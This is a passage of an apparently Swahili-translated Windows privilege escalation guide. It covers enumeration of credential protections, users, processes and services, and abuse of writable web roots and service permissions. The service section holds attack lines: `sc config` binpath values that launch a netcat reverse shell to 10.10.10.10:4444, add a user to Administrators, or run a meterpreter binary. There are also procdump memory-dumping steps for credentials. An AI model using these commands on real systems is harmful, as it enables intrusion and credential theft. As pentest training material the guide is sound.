Windows Event Forwarding, inafurahisha kujua kumbukumbu zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, ikihakikisha kuwa kila nywila ni **ya kipekee, imetengenezwa bila mpangilio, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory, na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, zinazowaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Domain credentials** huthibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida huanzishwa domain credentials za mtumiaji.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa vikundi vyovyote ulivyo mwanachama vina ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye ruhusa za juu

Ikiwa wewe ni mwanachama wa kikundi fulani chenye ruhusa za juu, unaweza kuweza kuongeza ruhusa zako. Jifunze kuhusu vikundi vyenye ruhusa za juu na jinsi ya kuvitumia vibaya ili kuongeza ruhusa zako hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendesha

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **angalia kama kuna nywila kwenye command line ya mchakato**.\
Angalia kama unaweza **kuandika juu ya binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama [**electron/cef/chromium debuggers** zinafanya kazi; unaweza kuzitumia vibaya ili kuongeza privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwa hai kwa muda mfupi, kwa hivyo kutokuwepo kwake kwenye snapshot moja ya passive port hakuthibitishi kuwa haikuwahi kufichuliwa. Linganisha listener yoyote uliyoiona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezekano wa kutekeleza code kati ya watumiaji. Weka enumeration ya kawaida kuwa passive badala ya kutuma debugger commands.

**Kukagua ruhusa za binary za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za faili za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort kwa akaunti tofauti, kagua usanidi huo mahususi na ACL ya saraka ya modules iliyotajwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kukaguliwa kwa uwezekano wa code execution task au service hiyo itakapopakia modules tena. Thibitisha privileges halisi za akaunti ya run-as, usanidi unaotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikiwa pekee haithibitishi privilege escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges za juu na document root inayoweza kuandikiwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti ya run-as na `DocumentRoot` iliyo kwenye `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kwamba service inaendeshwa, kwamba njia hiyo mahususi inahudumiwa, na kwamba handler ya upande wa server inachakata aina ya faili hiyo; root inayoweza kuandikiwa peke yake inathibitisha tu uwezo wa kuunda faili. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, huduma inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa mpangilio wa biti 32), ikiwa na usanidi karibu nayo chini ya `conf\httpd.conf` na saraka chaguomsingi ya msingi `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya huduma, utambulisho inayoendeshwa nao, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na ubadilishaji wa virtual-host), na ACL ya saraka msingi. Saraka ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Saraka msingi ya IIS inayoweza kuandikwa na utambulisho wa pool ya programu kwenye mtandao

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **tovuti/programu inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na handler ya upande wa seva. Msimbo uliowekwa kwenye saraka inayotolewa kwa watumiaji huendeshwa kama pool hiyo ikiwa tu IIS inachakata aina hiyo ya faili na njia inaweza kufikiwa. Kagua ruhusa halisi za mtumiaji wa sasa za kuunda faili, hali ya uendeshaji wa tovuti, handler na ubatilishaji unaotumika kwa njia husika kabla ya kuhitimisha kwamba saraka inayoweza kuandikwa inamaanisha utekelezaji wa msimbo.

Ukusanyaji wa msimbo wa ASP.NET unaobadilika huleta njia tofauti ya kuchunguza: faili zinazozalishwa chini ya saraka ya ukusanyaji ya programu. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` iliyo chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya programu inaweza kuibadilisha. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye mapendeleo ya chini inaweza kubadilisha chanzo kilichozalishwa katika akiba ya **programu mahususi**, tambua kama programu hiyo itakusanya upya chini ya [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) yenye mapendeleo zaidi. ACL ya faili au saraka peke yake haithibitishi utekelezaji wa msimbo: linganisha akiba na programu inayotumika, tokeni na ACL halisi, mipangilio ya ukusanyaji, utambulisho wa mchakato, na muda wa ukusanyaji wowote upya. Tumia ukaguzi wa metadata ya kusoma pekee; usianzishe ukusanyaji wala kubadilisha faili za akiba wakati wa uchunguzi.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa rasilimali za domain kwa kutumia **akaunti ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na mapendeleo ya chini. `LocalSystem` tayari ina mapendeleo ya juu ndani ya kompyuta na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia vitambulisho fiche vya mtandao. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usiobainishwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya matoleo ya IIS; kwa hiyo, bainisha usanidi halisi badala ya kubashiri kutokana na jina la pool. Ikiwa utekelezaji wa msimbo unafikia pool yenye utambulisho wa akaunti ya kompyuta kwenye mtandao, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye muktadha wa kutaja majina wa domain; tiketi ya akaunti ya mashine au jukumu la host peke yake havithibitishi ruhusa hizo. Uchunguzi tulivu unapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa mtandao, au kuomba tiketi.

Kwa ASP.NET handler inayosomeka na inayoanzisha mchakato saidizi, fuatilia thamani yoyote inayotokana na ombi kupitia uthibitishaji, usimbuaji fiche, uthibitishaji wa uhalali na uundaji wa amri. Handler inayounganisha tokeni iliyofumbuliwa ndani ya `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu alama maalum za shell kubadilisha amri; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba mpigaji asiyeaminika anaweza kweli kudhibiti thamani iliyofumbuliwa na kufikia handler, kisha bainisha utambulisho halisi wa pool ya programu au wa mtu aliyefanyiwa impersonation na utambulisho wa mchakato tanzu. Mstari wa chanzo unaosomeka, listener ya localhost, au udhaifu wa muundo wa tokeni peke yake havithibitishi utekelezaji wa amri wenye mapendeleo. Kagua chanzo na usanidi wa pool bila kutuma maombi ya kughushi au kuendesha mchakato saidizi wakati wa uchunguzi tulivu.

Kwa huduma ya PHP kwenye Windows, njia inayodhibitiwa na ombi na kupitishwa kwa [`include` or `require`](https://www.php.net/manual/en/function.include.php) inaweza kutathmini faili ya PHP inayoweza kuandikwa na mtumiaji wa chini kwa kutumia utambulisho wa worker. Thibitisha kwamba ombi linaweza kufikia kauli hiyo, njia iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji wa chini anaweza kurekebisha na worker anaweza kusoma, vizuizi husika vya njia za PHP vinaruhusu include, na worker kweli inaendeshwa kwa mapendeleo ya juu zaidi. Listener ya loopback au faili inayoweza kuandikwa peke yake haithibitishi mnyororo huu; kagua chanzo, utambulisho wa huduma na ACL za faili bila kuita endpoint wakati wa uchunguzi tulivu.

### Memory Password mining

Unaweza kuunda dump ya kumbukumbu ya mchakato unaoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **vitambulisho katika maandishi wazi kwenye kumbukumbu**; jaribu kudump kumbukumbu na kusoma vitambulisho hivyo.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi wenye upendeleo

Programu inayofungua kiotomatiki miradi kutoka kwenye saraka ya kuachia faili ambayo mtumiaji wa kiwango cha chini anaweza kuandika huvuka mpaka wa uaminifu wa ingizo kwa kutumia akaunti ya programu inayoingiza faili. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake unaotumika, na toleo la parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha akaunti inayoingiza faili kuthibitishwa ikiwa [sera za SMB na NTLM zinazotoka](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu hilo. Hii ni dalili ya uwezekano wa kufichuka kwa credentials, si ufikiaji wa msimamizi wa papo hapo: jibu lazima liweze kutumika kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na build za sasa lazima zikaguliwe kulingana na hali halisi ya patch zake. Usifungue mradi uliotengenezwa kwa makusudi wakati wa uchunguzi wa kimyakimya; kagua mtiririko wa uingizaji na ACL.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kipengee cha Service Control Manager (SCM) ni tofauti na haki za huduma iliyopo. Ombi lililofanikiwa la kusoma pekee la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) la haki hiyo ni dalili ya kuchunguza, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za huduma zilizoombwa wakati wa kuunda; huduma inapofunguliwa tena baadaye, ukaguzi tofauti wa ufikiaji hufanyika na unaweza kushindwa hata kama handle ya awali ingeweza kutumika. Thibitisha kando tokeni inayotumika ya ndani au ya mbali, haki za handle zilizotolewa, akaunti ya huduma, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha huduma wakati wa uchunguzi wa kimyakimya.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya executable ya ndani ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna haki za SCM zilizo pana isivyo kawaida na njia ya kuweka faili; share ya kiutawala si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au dalili ya ruhusa ya kuunda huduma kwenye SCM pekee, hauthibitishi kwamba huduma mpya inaweza kuanzishwa kwa utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable saidizi wakati wa kuanzisha, kuzima, au tukio jingine la mzunguko wa maisha hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatatuliwa kuwa saraka ambayo mtumiaji wa kiwango cha chini anaweza kuandikia, na huduma inaendeshwa kwa utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa faili ya kubadilisha, kwa masharti fulani. Thibitisha **msimbo halisi wa huduma au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, haki za kuunda saraka, utambulisho wa huduma, na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee haithibitishi kwamba huduma itapakia faili hiyo; ukaguzi wa kimyakimya haupaswi kuanzisha wala kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START huruhusu kutoa hoja kwa StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuianzisha kama zaidi ya haki ya udhibiti. Ikiwa inatumia hoja iliyochaguliwa na mwitaji kama njia ya logi au export, thibitisha utambulisho wa huduma, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kusababisha escalation tu ikiwa kuna consumer au loader nyingine yenye upendeleo inayokubali faili hiyo; logi inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Orodha ya kimyakimya haipaswi kuanzisha huduma wala kuunda faili ya majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, `nsclient.ini` inayoweza kusomwa ni **dalili ya kukagua usanidi**: inaweza kuwa na credentials za web, ilhali `boot.ini` inaweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener na sera ya ufikiaji ya WEB, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye upendeleo pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki inayotumika ya kusajili au kurekebisha command, na kichocheo kinachoitekeleza chini ya utambulisho wa huduma. Listener inayopokea miunganisho ya loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, nenosiri, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa uchunguzi wa kimyakimya. Tazama [mpangilio wa faili wa NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya huduma inayotumika na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu child hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kazi iliyosanidiwa. Kagua executable ya child na ACL za saraka zake za juu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayowasilishwa na child hiyo ni dalili tofauti ya kuchunguza: thibitisha kwamba mtumiaji mwenye upendeleo wa chini anaweza kufikia listener, operation halisi inakubali ingizo lake, na child ya huduma inatekeleza operation isiyo salama kwa utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi escalation; epuka kuita operations za huduma wakati wa uchunguzi wa kimyakimya.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mwitaji inapoingia kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye credentials za Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha mteja, lakini ruhusa ya kuita operation hiyo **maalum** na utambulisho unaotumika wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mwitaji mwenye upendeleo wa chini hadi `AddScript` chini ya utambulisho wa huduma wenye upendeleo wa juu ni mpaka wa utekelezaji wa code; port inayosikiliza, mteja aliyethibitishwa, au method isiyotumika katika assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyosakinishwa, contract, uidhinishaji, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa uchunguzi.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha huduma zenye upendeleo kwa kuwasha triggers zake. Tazama mbinu za kuorodhesha na kuwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya kukusanya uchunguzi ya Visual Studio

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia junction na race ya object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa triage ya kimyakimya, kagua akaunti ya huduma hiyo na njia ya binary yake, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya patch ya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kwamba host ina udhaifu. Ukaguzi hauhitaji kuanzisha huduma wala kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata hitilafu hii (kwa mfano, na SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Service haiwezi kuwashwa kwa sababu imezimwa au hakuna vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba service upnphost hutegemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kutatua tatizo hili** ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kikundi cha "Authenticated users" kina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa na service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Haki za juu zinaweza kupatikana kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kubadilisha usanidi wa binary ya service.
- **WRITE_DAC**: Inaruhusu kubadilisha ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na kubadilisha ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye upendeleo, lakini **watumiaji wenye upendeleo mdogo wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa kwa **kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ilipo binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye faili tekelezi ya huduma au saraka iliyo nayo. Njia ya kawaida ya kutumia udhaifu huu ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya huduma na njia ya faili tekelezi kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya huduma kwa payload au binary halali ya huduma hasidi.
4. Anzisha upya huduma kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa kompyuta / kichocheo cha huduma).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa service hairuhusu mtumiaji wa kawaida kuianzisha upya, angalia ikiwa inaanza kiotomatiki wakati wa kuwasha kompyuta, ina failure action inayoianzisha tena, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na application inayoitumia.

### Ruhusa za kurekebisha service registry

Unapaswa kuangalia ikiwa unaweza kurekebisha service registry yoyote.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya service kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

